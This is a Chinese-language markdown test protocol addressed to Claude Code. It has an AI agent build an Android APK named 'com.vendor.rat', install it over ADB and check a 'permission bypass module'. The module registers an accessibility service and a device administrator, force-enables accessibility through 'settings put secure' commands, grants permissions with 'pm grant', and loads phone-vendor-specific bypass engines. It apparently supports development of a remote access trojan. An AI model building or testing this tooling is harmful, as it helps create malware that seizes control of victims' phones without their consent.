# 设备验证协议 — 权限绕过模块 (MODULE_02)

> Claude Code 执行此协议来构建 APK、安装到设备、验证权限绕过模块是否正常工作。

## 前置条件

```
ADB = /mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
DEVICE = 192.168.31.162:5555
PACKAGE = com.vendor.rat
APK = android/app/build/outputs/apk/debug/app-debug.apk
```

---

## Phase 1: 构建 APK

```bash
cd /home/code/php/project/full-package/android && ./gradlew assembleDebug 2>&1 | tail -20
```

验证: `BUILD SUCCESSFUL` + APK 文件存在

---

## Phase 2: 连接设备 + 安装

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
DEVICE="192.168.31.162:5555"

# 连接
$ADB connect $DEVICE

# 确认连接
$ADB -s $DEVICE devices

# 卸载旧版本 (忽略错误)
$ADB -s $DEVICE uninstall com.vendor.rat 2>/dev/null

# 安装
$ADB -s $DEVICE install -r android/app/build/outputs/apk/debug/app-debug.apk
```

验证: `Success`

---

## Phase 3: 验证 MODULE_02 权限绕过

### 3.1 应用启动验证

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
DEVICE="192.168.31.162:5555"

# 启动应用
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.ActivMain

# 等待启动
sleep 3

# 检查进程是否存活
$ADB -s $DEVICE shell pidof com.vendor.rat
```

验证: 返回 PID (非空)

### 3.2 无障碍服务注册验证

```bash
# 检查无障碍服务是否在系统中注册
$ADB -s $DEVICE shell dumpsys accessibility | grep -i "com.vendor.rat"

# 检查服务组件是否存在
$ADB -s $DEVICE shell pm dump com.vendor.rat | grep -A2 "MyAccessibilityService"
```

验证: 能看到 `com.vendor.rat/.service.MyAccessibilityService`

### 3.3 设备管理员注册验证

```bash
# 检查设备管理员是否在系统中注册
$ADB -s $DEVICE shell dumpsys device_policy | grep -i "com.vendor.rat"

# 检查 receiver 组件
$ADB -s $DEVICE shell pm dump com.vendor.rat | grep -A2 "AppDeviceAdminReceiver"
```

验证: 能看到 `com.vendor.rat/.service.AppDeviceAdminReceiver`

### 3.4 手动激活无障碍服务

```bash
# 打开无障碍设置页面 (需要用户手动开启)
$ADB -s $DEVICE shell am start -a android.settings.ACCESSIBILITY_SETTINGS

# 或者通过 settings 命令直接启用 (部分设备支持)
$ADB -s $DEVICE shell settings put secure enabled_accessibility_services com.vendor.rat/com.vendor.rat.service.MyAccessibilityService
$ADB -s $DEVICE shell settings put secure accessibility_enabled 1

# 验证是否已启用
$ADB -s $DEVICE shell settings get secure enabled_accessibility_services
```

验证: 输出包含 `com.vendor.rat`

### 3.5 无障碍服务运行状态验证

```bash
# 检查服务是否正在运行
$ADB -s $DEVICE shell dumpsys accessibility | grep -A10 "com.vendor.rat"

# 查看应用日志 (过滤关键 TAG)
$ADB -s $DEVICE shell logcat -d -s "MyAccessibilityService" "EngineManager" "AutoEngine" "AppDeviceAdmin" | tail -50
```

验证:
- 服务状态为 `isEnabled=true`
- 日志中无 crash/exception

### 3.6 设备管理员激活验证

```bash
# 请求激活设备管理员
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.PermissionActivity

sleep 3

# 检查设备管理员是否已激活
$ADB -s $DEVICE shell dumpsys device_policy | grep -A5 "com.vendor.rat"
```

验证: `isActive=true` 或类似激活状态

### 3.7 引擎管理器验证

```bash
# 查看 EngineManager 相关日志
$ADB -s $DEVICE shell logcat -d -s "EngineManager" | tail -30

# 查看厂商引擎加载日志
$ADB -s $DEVICE shell logcat -d | grep -i "engine\|huawei\|xiaomi\|oppo\|vivo\|samsung" | tail -20
```

验证: 引擎已加载，无 ClassNotFoundException 或 NoSuchMethodError

### 3.8 Crash 检查

```bash
# 检查是否有 ANR
$ADB -s $DEVICE shell ls /data/anr/ 2>/dev/null

# 检查应用是否有 crash
$ADB -s $DEVICE shell logcat -d | grep -E "FATAL|AndroidRuntime|com.vendor.rat.*Exception" | tail -20

# 检查 tombstone
$ADB -s $DEVICE shell logcat -d -s "AndroidRuntime" | tail -30
```

验证: 无 FATAL EXCEPTION，无 ANR

---

## Phase 4: 综合报告

执行完所有检查后，输出报告：

```
MODULE_02 权限绕过模块 — 设备验证报告
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
设备: {device_model} / Android {version}
APK:  {build_time} / {apk_size}

┌─────────────────────────┬────────┬──────────────────────┐
│ 检查项                   │ 状态   │ 详情                  │
├─────────────────────────┼────────┼──────────────────────┤
│ 3.1 应用启动             │ ✅/❌  │ PID=xxxx              │
│ 3.2 无障碍服务注册       │ ✅/❌  │ 已注册/未找到          │
│ 3.3 设备管理员注册       │ ✅/❌  │ 已注册/未找到          │
│ 3.4 无障碍服务激活       │ ✅/❌  │ enabled/disabled      │
│ 3.5 无障碍服务运行       │ ✅/❌  │ running/stopped       │
│ 3.6 设备管理员激活       │ ✅/❌  │ active/inactive       │
│ 3.7 引擎加载             │ ✅/❌  │ 已加载 X 个引擎       │
│ 3.8 无 Crash             │ ✅/❌  │ 无异常/有异常          │
└─────────────────────────┴────────┴──────────────────────┘

问题列表:
- (如有失败项，列出具体错误和建议修复方案)
```

---

## 故障排查

| 症状 | 可能原因 | 排查命令 |
|------|---------|---------|
| 安装失败 INSTALL_FAILED_UPDATE_INCOMPATIBLE | 签名不一致 | 先 `adb uninstall` 再安装 |
| 应用启动后立即退出 | Application/Activity crash | `logcat -s AndroidRuntime` |
| 无障碍服务无法启用 | xml 配置错误 | `pm dump com.vendor.rat` 检查 meta-data |
| 设备管理员无法激活 | device_admin.xml 缺失 | 检查 `res/xml/device_admin.xml` |
| 引擎加载失败 | 类找不到/方法签名不匹配 | `logcat` 搜索 ClassNotFoundException |
| 权限被拒绝 | 运行时权限未授予 | `adb shell pm grant com.vendor.rat android.permission.XXX` |
